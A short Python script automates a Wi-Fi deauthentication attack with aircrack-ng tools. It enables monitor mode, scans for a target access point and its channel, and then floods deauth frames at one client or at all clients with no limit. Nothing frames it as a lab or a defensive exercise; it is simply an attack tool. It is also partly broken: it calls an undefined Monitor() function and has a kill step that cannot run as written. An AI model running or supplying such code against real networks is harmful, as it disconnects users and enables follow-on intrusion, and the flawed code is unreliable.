import os
import time

                  #network interface-mon#
os.system('iwconfig')
interface = input("What is your network interface name? ")
Monitoring = input("Do you want the network change to Monitor (y/n): ")
if Monitoring == "y":
    os.system('airmon-ng start ' + interface)
    os.system('airmon-ng check kill ' + interface)
else:
    pass
###########################################################################
    
def scan_wifi():
    os.system("airodump-ng " + interface) # Run airodump-ng for scanning
    time.sleep(1) # Sleep for 1 seconds
    os.system("pkill airodump-ng") # Stop airodump-ng after 1 seconds
    bssid = input("Enter the BSSID of the Wi-Fi: ")
    return bssid

def find_ch(bssid):
    ch = input("Enter the channel of the Wi-Fi: ")
    os.system(f"airodump-ng --bssid {bssid} -c {ch} " + interface) # final scan
    return ch

def attack(bssid, interface):
    q = input("Do you want your attack mode 1 user ? (y/n): ")
    if q.lower() == 'y':
        destination = input("Enter the destination of the desired Wi-Fi: ")
        os.system(f"aireplay-ng --deauth 0 -a {bssid} -c {destination} {interface}")
    elif q.lower() == 'n':
        os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}")
    else:
        print("Invalid input. Please enter 'y' or 'n'.")


bssid = scan_wifi()
ch = find_ch(bssid)
time.sleep(1) # Sleep for 1 seconds before running deauthentication attack
Monitor()
attack(bssid, interface)






